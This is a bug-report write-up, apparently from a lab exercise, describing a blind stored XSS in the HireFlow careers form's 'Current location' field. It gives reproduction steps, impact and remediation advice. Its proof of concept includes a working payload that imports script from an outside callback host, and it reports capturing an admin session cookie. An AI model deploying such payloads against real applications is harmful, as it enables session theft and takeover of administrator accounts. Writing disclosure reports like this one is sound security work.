## Title
Blind XSS - HireFlow Careers

## Description
**Affected URL:** https://hireflow.pwnedbox.site/

The HireFlow careers application accepts user-controlled input through candidate application fields. A crafted HTML payload was submitted through the application form and stored by the application.

When the submitted candidate information was accessed through the administrative interface, the payload executed JavaScript in the administrator's browser and generated callbacks to XSS.Report. This confirms a Blind Stored XSS vulnerability.

## Steps to Reproduce
1. Open `https://hireflow.pwnedbox.site/apply.php?job=1`.
2. Enter the XSS payload in the application form's Current location field.
3. Complete the required fields and submit the application.
4. Open the HireFlow administrative dashboard and access the submitted candidate information.
5. Check XSS.Report for the captured callbacks.

## POC (Proof of Concept)
**Lab Address:** https://hireflow.pwnedbox.site/

**Affected Field:** Current location

**Payload:**
```html
"><iMAGE/src/onerror=import('//xss.report/c/mihir')>
```

**Observed Result:**
The submitted candidate appeared in the administrative dashboard. XSS.Report recorded two callbacks originating from the HireFlow administrative interface.

The captured report showed:
- **Vulnerable Page URL:** `https://hireflow.pwnedbox.site/admin/index.php`
- **Referrer:** `https://hireflow.pwnedbox.site/status.php?ref=HF-7701A054`
- **Cookie:** A `PHPSESSID` value was captured.

This demonstrates JavaScript execution in the administrative browsing context. Session hijacking or unauthorized administrative actions were not independently demonstrated.

**Screenshot Evidence:**
1. Careers application form containing the injected payload.
<img width="1919" height="974" alt="image" src="https://github.com/user-attachments/assets/88efbac3-208b-45d5-b440-a5a944bc290d" />

2. Administrative dashboard displaying the submitted candidate.
<img width="1919" height="980" alt="image" src="https://github.com/user-attachments/assets/03220730-aaac-4685-b63b-f4f15ef12816" />

3. XSS.Report dashboard showing two captured callbacks.
<img width="1919" height="980" alt="image" src="https://github.com/user-attachments/assets/eebc0509-cc68-47df-adfe-400a7f3b118d" />

4. Detailed XSS report showing the administrative URL, referrer, and cookie information.
<img width="1917" height="981" alt="image" src="https://github.com/user-attachments/assets/78d08d7e-b1a2-4388-8522-ffeef7f29e91" />


## Impact
An attacker could submit a malicious job application that executes JavaScript when an administrator views the submitted candidate information.

- It may expose sensitive information accessible through the administrator's browser.
- It may allow unauthorized actions within the administrator's authenticated session.
- It may expose session cookie information if cookies are not protected with the `HttpOnly` attribute.
- It may allow manipulation of the administrative interface.

## Remediation
1. Apply context-aware output encoding to all candidate-submitted fields before rendering them.
2. Prevent untrusted HTML and JavaScript from executing in administrative pages.
3. Use safe templating methods instead of directly inserting user input into HTML.
4. Set session cookies with the `HttpOnly`, `Secure`, and appropriate `SameSite` attributes.
5. Review and sanitize previously stored candidate applications.
